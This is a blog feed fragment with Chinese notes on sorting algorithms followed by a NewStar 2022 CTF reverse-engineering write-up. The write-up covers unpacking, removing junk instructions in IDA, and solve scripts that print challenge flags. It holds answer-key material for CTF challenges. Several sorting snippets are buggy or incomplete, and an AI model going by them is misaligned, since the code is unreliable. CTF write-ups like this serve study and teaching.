        <content type="html"><![CDATA[        <h1 id="排序算法"   >          <a href="#排序算法" class="heading-link"><i class="fas fa-link"></i></a><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h1>              <h2 id="冒泡排序，插入排序，选择排序"   >          <a href="#冒泡排序，插入排序，选择排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#冒泡排序，插入排序，选择排序" class="headerlink" title="冒泡排序，插入排序，选择排序"></a>冒泡排序，插入排序，选择排序</h2>      <p>冒泡，插入，选择排序是最基础的交换排序</p><p>时间复杂度<br>$$<br>O(n^2)<br>$$<br>冒泡排序：</p><p>冒泡排序是一种离线的算法</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    <span class="type">bool</span> tmp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &gt; a[j + <span class="number">1</span>])&#123;</span><br><span class="line"><span class="built_in">swap</span>(a[j], a[j + <span class="number">1</span>]);</span><br><span class="line">            tmp = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">if</span>(!tmp) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>插入排序：</p><p>插入排序是一种在线的算法</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> arr[], key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> key = arr[len];</span><br><span class="line"><span class="keyword">while</span>(len &gt; <span class="number">1</span> &amp;&amp; arr[len - <span class="number">1</span>] &gt; key)&#123;</span><br><span class="line">arr[len] = arr[len - <span class="number">1</span>];</span><br><span class="line">len--;</span><br><span class="line">&#125;</span><br><span class="line">arr[len] = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>选择排序：</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)&#123;</span><br><span class="line"><span class="type">int</span> tmp = arr[i];</span><br><span class="line"><span class="type">int</span> mx = i;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(tmp &gt; arr[i])&#123;</span><br><span class="line">tmp = arr[i];</span><br><span class="line">mx = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(mx != i) <span class="built_in">swap</span>(arr[i], arr[mx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="桶排序"   >          <a href="#桶排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h2>      <p>桶排序是排序算法的一种，适用于待排序数据值域较小的情况</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> bucket[<span class="number">110</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">bucket[a[i]]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(bucket[i] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">while</span>(bucket[i]--) cout &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="快速排序"   >          <a href="#快速排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2>      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">qsort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i = l, j = r;</span><br><span class="line"><span class="type">int</span> piovt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="归并排序"   >          <a href="#归并排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2>              <h2 id="堆排序"   >          <a href="#堆排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2>      ]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStar2022wp</title>
      <link href="/2022/09/30/NewStar2022wp/"/>
      <url>/2022/09/30/NewStar2022wp/</url>
      
        <content type="html"><![CDATA[        <h1 id="Week-2"   >          <a href="#Week-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Week-2" class="headerlink" title="Week 2"></a>Week 2</h1>              <h2 id="FindME"   >          <a href="#FindME" class="heading-link"><i class="fas fa-link"></i></a><a href="#FindME" class="headerlink" title="FindME"></a>FindME</h2>      <p>ida64打开</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205935.png" alt="image-20220930235535614"></p><p>打开sub_1BCD函数 发现是一堆return 的函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205936.png" alt="image-20220930235700807"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205937.png" alt="image-20220930235756541"></p><p>找到其中一个有用的函数之后对 s 按 x直接查询交叉引用</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205938.png" alt="image-20220930235909095"></p><p>从下往上执行</p>        <h2 id="Likemayasp"   >          <a href="#Likemayasp" class="heading-link"><i class="fas fa-link"></i></a><a href="#Likemayasp" class="headerlink" title="Likemayasp"></a>Likemayasp</h2>      <p>这题看起来是个ASP壳，但是PE识别的结果是UPX壳</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205939.png" alt="image-20220930230211565"></p><p>可以利用010修改壳头即可用UPX工具破开。当然也可以利用程序在运行的时候自己解壳的特性来动态调试。</p><p>ida打开，选择Local Windows debugger</p><p>Debugger——Attach to Process——选择需要调试的进程</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205940.png" alt="image-20220930231158830"></p><p>动态调试即可到达加密函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205941.jpg" alt="0564fb81e93b43f34e458c7581381f1"></p><p>对密文进行一个长度判断后，位移后4个数一组进行判断</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205942.jpg" alt="e812521a5b3609e106010eacfd7fda6"></p><p>写py脚本解密</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">0x0D803C1FC098</span>, <span class="number">0x0E20360BC097</span>, <span class="number">0x0FE02A1C00A0</span>, <span class="number">0x0FA0121040CB</span>, <span class="number">0x0F2032104092</span>, <span class="number">0x0D6015884082</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    z = <span class="string">&quot;&quot;</span></span><br><span class="line">    z += <span class="built_in">chr</span>(((i &gt;&gt; <span class="number">37</span>) ^ <span class="number">0xA</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">    z += <span class="built_in">chr</span>((((i &lt;&lt; <span class="number">27</span>) &gt;&gt; <span class="number">50</span>) ^ <span class="number">0x14</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">    z += <span class="built_in">chr</span>((((i &lt;&lt; <span class="number">41</span>) &gt;&gt; <span class="number">55</span>) ^ <span class="number">0x1E</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">    z += <span class="built_in">chr</span>(~(((i &lt;&lt; <span class="number">50</span>) &gt;&gt; <span class="number">50</span>)) &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="built_in">print</span>(z, end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;x1hu@n_w0_4sp_ma??&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="Petals"   >          <a href="#Petals" class="heading-link"><i class="fas fa-link"></i></a><a href="#Petals" class="headerlink" title="Petals"></a>Petals</h2>      <p>ida64打开</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205943.png" alt="image-20220930233632468"></p><p>sub_160C是判断函数</p><p>sub_1208 + 1无法跳转到函数，查看汇编</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205944.png" alt="image-20220930233735802"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205945.png" alt="image-20220930233755314"></p><p>发现花指令，上面多了一行push rbx</p><p>D 变为数据后重新定位</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205946.png" alt="image-20220930233854879"></p><p>不难看出09才是函数的开头</p><p>选中后按p定义为函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205947.png" alt="image-20220930233940746"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205948.png" alt="image-20220930233952235"></p><p>然而修改后还有红色的，打开汇编再往下看</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205949.png" alt="image-20220930234022685"></p><p>jn jnz 花指令</p><p>D 完后 nop掉多余的垃圾数据</p><p>一定要nop掉，这两节本来应该是同一个函数，被垃圾数据分割后不仅反汇编错误，还错误的将sub1208识别为void，原本应该是有返回值的。不nop掉会导致前半部分的函数不完整而且使得后半部分的函数的变量无法正常继承。</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205950.png" alt="image-20220930234247534"></p><p>并且将函数的返回值定义为int *</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205951.png" alt="image-20220930234338778"></p><p>首先初始化一个v5的数组作为码表，然后再进行替换，逆向的方法选择爆破</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">x = []</span><br><span class="line"><span class="built_in">input</span> = [<span class="number">208</span>, <span class="number">208</span>, <span class="number">133</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">197</span>, <span class="number">138</span>, <span class="number">147</span>, <span class="number">137</span>,</span><br><span class="line">        <span class="number">146</span>, <span class="number">143</span>, <span class="number">135</span>, <span class="number">136</span>, <span class="number">159</span>, <span class="number">143</span>, <span class="number">197</span>, <span class="number">132</span>, <span class="number">214</span>, <span class="number">209</span>,</span><br><span class="line">        <span class="number">210</span>, <span class="number">130</span>, <span class="number">211</span>, <span class="number">222</span>, <span class="number">135</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">    x.append(~(i ^ <span class="number">25</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">25</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">input</span>[i] == x[j]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="comment"># 66ccff#luotianyi#b074d58a</span></span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(<span class="string">&quot;66ccff#luotianyi#b074d58a&quot;</span>.encode())</span><br><span class="line"><span class="built_in">print</span>(m.hexdigest())</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d780c9b2d2aa9d40010a753bc15770de&#125;</span><br></pre></td></tr></table></div></figure>        <h1 id="Week-3"   >          <a href="#Week-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Week-3" class="headerlink" title="Week 3"></a>Week 3</h1>              <h2 id="Zzzzz3333"   >          <a href="#Zzzzz3333" class="heading-link"><i class="fas fa-link"></i></a><a href="#Zzzzz3333" class="headerlink" title="Zzzzz3333"></a>Zzzzz3333</h2>      <p>32位IDA</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205952.png" alt="image-20221005203130856"></p><p>用z3解出x，然后再输出</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x = Ints(<span class="string">f&quot;x<span class="subst">&#123;i&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>))</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(x[<span class="number">3</span>] + <span class="number">4</span> * x[<span class="number">2</span>] + x[<span class="number">7</span>] + <span class="number">4</span> * (x[<span class="number">3</span>] + <span class="number">4</span> * x[<span class="number">2</span>]) + <span class="number">3</span> * (x[<span class="number">4</span>] + <span class="number">4</span> * x[<span class="number">0</span>]) + <span class="number">2</span> * (x[<span class="number">5</span>] + <span class="number">4</span> * x[<span class="number">6</span>]) + <span class="number">11</span> * x[<span class="number">1</span>] == <span class="number">6426</span>)</span><br><span class="line">s.add(<span class="number">11</span> * (x[<span class="number">0</span>] + x[<span class="number">7</span>] + x[<span class="number">3</span>]) + <span class="number">4</span> * (x[<span class="number">5</span>] + <span class="number">2</span> * x[<span class="number">4</span>]) + x[<span class="number">2</span>] + <span class="number">45</span> * x[<span class="number">1</span>] + <span class="number">7</span> * x[<span class="number">6</span>] == <span class="number">9801</span>)</span><br><span class="line">s.add(<span class="number">5</span> * x[<span class="number">1</span>] + <span class="number">2</span> * (x[<span class="number">4</span>] + x[<span class="number">6</span>] + x[<span class="number">5</span>] + <span class="number">2</span> * (x[<span class="number">7</span>] + x[<span class="number">3</span>]) + x[<span class="number">2</span>] + <span class="number">2</span> * (x[<span class="number">6</span>] + x[<span class="number">5</span>] + <span class="number">2</span> * (x[<span class="number">7</span>] + x[<span class="number">3</span>])) + <span class="number">8</span> * x[<span class="number">0</span>]) == <span class="number">6021</span>)</span><br><span class="line">s.add(<span class="number">19</span> * x[<span class="number">0</span>] + <span class="number">9</span> * x[<span class="number">1</span>] + <span class="number">67</span> * x[<span class="number">7</span>] + <span class="number">5</span> * (x[<span class="number">2</span>] + x[<span class="number">6</span>]) + <span class="number">7</span> * (x[<span class="number">5</span>] + <span class="number">4</span> * x[<span class="number">3</span>]) + <span class="number">4</span> * x[<span class="number">4</span>] == <span class="number">14444</span>)</span><br><span class="line">s.add(<span class="number">22</span> * x[<span class="number">5</span>] + <span class="number">5</span> * (x[<span class="number">4</span>] + <span class="number">2</span> * (x[<span class="number">3</span>] + x[<span class="number">1</span>] + <span class="number">2</span> * x[<span class="number">0</span>])) + <span class="number">4</span> * (x[<span class="number">7</span>] + x[<span class="number">6</span>]) + <span class="number">6</span> * x[<span class="number">2</span>] == <span class="number">7251</span>)</span><br><span class="line">s.add(<span class="number">19</span> * x[<span class="number">3</span>] + <span class="number">3</span> * (x[<span class="number">7</span>] + x[<span class="number">2</span>] + <span class="number">4</span> * x[<span class="number">7</span>] + x[<span class="number">6</span>] + <span class="number">2</span> * (x[<span class="number">7</span>] + x[<span class="number">2</span>] + <span class="number">4</span> * x[<span class="number">7</span>])) + <span class="number">4</span> * (x[<span class="number">0</span>] + x[<span class="number">5</span>] + x[<span class="number">1</span>] + <span class="number">2</span> * (x[<span class="number">0</span>] + x[<span class="number">5</span>])) == <span class="number">10054</span>)</span><br><span class="line">s.add(<span class="number">7</span> * x[<span class="number">0</span>] + <span class="number">17</span> * (x[<span class="number">3</span>] + x[<span class="number">1</span>]*<span class="number">2</span>) + <span class="number">11</span> * (x[<span class="number">4</span>] + <span class="number">2</span> * x[<span class="number">5</span>]) + <span class="number">2</span> * (x[<span class="number">2</span>] + x[<span class="number">6</span>] + <span class="number">4</span> * x[<span class="number">2</span>] + <span class="number">6</span> * x[<span class="number">7</span>]) == <span class="number">10735</span>)</span><br><span class="line">s.add(x[<span class="number">6</span>] + x[<span class="number">4</span>] + <span class="number">11</span> * x[<span class="number">2</span>] + <span class="number">15</span> * (x[<span class="number">3</span>] + <span class="number">2</span> * x[<span class="number">7</span>]) + x[<span class="number">1</span>]*<span class="number">2</span> + <span class="number">43</span> * x[<span class="number">0</span>] + <span class="number">21</span> * x[<span class="number">5</span>] == <span class="number">11646</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    result = s.model()</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">102</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">119</span>, <span class="number">49</span>, <span class="number">110</span>, <span class="number">100</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">y = [</span><br><span class="line">    <span class="number">0</span>,  <span class="number">13</span>,  <span class="number">13</span>,  <span class="number">11</span>,  <span class="number">12</span>, <span class="number">107</span>,  <span class="number">20</span>,  <span class="number">30</span>,  <span class="number">28</span>,  <span class="number">82</span>,</span><br><span class="line">   <span class="number">95</span>,  <span class="number">95</span>,  <span class="number">40</span>, <span class="number">120</span>,  <span class="number">29</span>,  <span class="number">59</span>,  <span class="number">37</span>,  <span class="number">14</span>,   <span class="number">3</span>,   <span class="number">0</span>,</span><br><span class="line">   <span class="number">86</span>,  <span class="number">16</span>,  <span class="number">79</span>,  <span class="number">25</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">24</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((y[i] &amp; (flag[i &amp; <span class="number">7</span>] ^ y[i]) | ~y[i] &amp; (~y[i] ^ ~flag[i &amp; <span class="number">7</span>])) &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><p>flag{Zzzz333_Is_Cool!!!}</p>        <h2 id="EzTea"   >          <a href="#EzTea" class="heading-link"><i class="fas fa-link"></i></a><a href="#EzTea" class="headerlink" title="EzTea"></a>EzTea</h2>      <p>64位ida</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205953.png" alt="image-20221005205054132"></p><p>点开函数，发现是xxtea加密</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205954.png" alt="image-20221005205253305"></p><p>只不过修改了MX和magic值</p><p>脚本</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (z&gt;&gt;4^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3 ^ z&lt;&lt;5)^(sum^y) + (k[ i&amp;3 ^ e] ^ z);</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">btea</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span>* v, <span class="type">long</span> n, <span class="type">unsigned</span> <span class="type">long</span>* k)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> z=v[n<span class="number">-1</span>], y=v[<span class="number">0</span>], sum=<span class="number">0</span>, e, DELTA=<span class="number">0x11451400</span>;</span><br><span class="line">    <span class="type">long</span> i, q ;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;         </span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        <span class="keyword">while</span> (q-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sum += DELTA;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n<span class="number">-1</span>; i++)&#123; </span><br><span class="line">            y = v[i+<span class="number">1</span>];</span><br><span class="line">            z = v[i] += MX;</span><br><span class="line">        &#125; </span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">    &#125; </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123; </span><br><span class="line">        n = -n;</span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = q*DELTA ;</span><br><span class="line">        <span class="keyword">while</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (i=n<span class="number">-1</span>; i&gt;<span class="number">0</span>; i--) &#123;</span><br><span class="line">            z = v[i<span class="number">-1</span>];</span><br><span class="line">            y = v[i] -= MX;   </span><br><span class="line">        &#125;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> key[] = &#123;<span class="number">0x19</span>, <span class="number">0x19</span>, <span class="number">0x08</span>, <span class="number">0x10</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> EntryData[] = &#123;<span class="number">0x38FA8A82</span>, <span class="number">0x0D7501380</span>, <span class="number">0x0E40969D</span>, <span class="number">0x4E169120</span>, <span class="number">0x713A29AB</span>,</span><br><span class="line">                        <span class="number">0x6CE5393D</span>, <span class="number">0x0B69D752E</span>, <span class="number">0x841A88E6</span>, <span class="number">0x6F31B459</span> &#125;;</span><br><span class="line">    <span class="built_in">btea</span>(EntryData, <span class="number">-9</span>, key);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">9</span>; j++) &#123;                        </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, EntryData[j] &amp; <span class="number">0xff</span>);</span><br><span class="line">                EntryData[j] &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;H0P3_U_L1k3_Th15_CUP_0f_TEa.&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="The-Slider’s-Labyrinth"   >          <a href="#The-Slider’s-Labyrinth" class="heading-link"><i class="fas fa-link"></i></a><a href="#The-Slider’s-Labyrinth" class="headerlink" title="The Slider’s Labyrinth"></a>The Slider’s Labyrinth</h2>      <p>32位ida</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205955.png" alt="image-20221005225658352"></p><p>这里加了好几个花指令</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205956.png" alt="image-20221005225718061"></p><p>主要都是这种死循环的，直接nop</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205957.png" alt="image-20221005230022013"></p><p>还是红的，再将hlt给nop掉</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205958.png" alt="image-20221005230104334"></p><p>于是就能正常显示了</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205959.png" alt="image-20221005230124689"></p><p>分析过程</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205960.png" alt="image-20221005230243637"></p><p>发现将输入减掉97后四个case，即w a s d控制上下左右，while循环让人物一直走到墙才停止，并且每行的长度是16</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132205961.png" alt="image-20221005230422289"></p><p>找到地图</p><p><img 